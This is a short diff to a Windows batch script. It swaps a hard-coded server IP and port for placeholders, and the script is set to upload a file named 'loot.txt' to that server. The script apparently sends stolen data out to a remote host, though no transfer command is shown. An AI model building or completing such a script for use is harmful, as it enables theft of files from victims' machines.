@@ -1,8 +1,8 @@
 @echo off
 
 REM Set the server host and port
-set "serverHost=143.42.5.48"
-set "serverPort=12345"
+set "serverHost=<server-ip>"
+set "serverPort=<server-port>"
 
 REM Set the path to the text file you want to upload
 set "filePath=loot.txt"
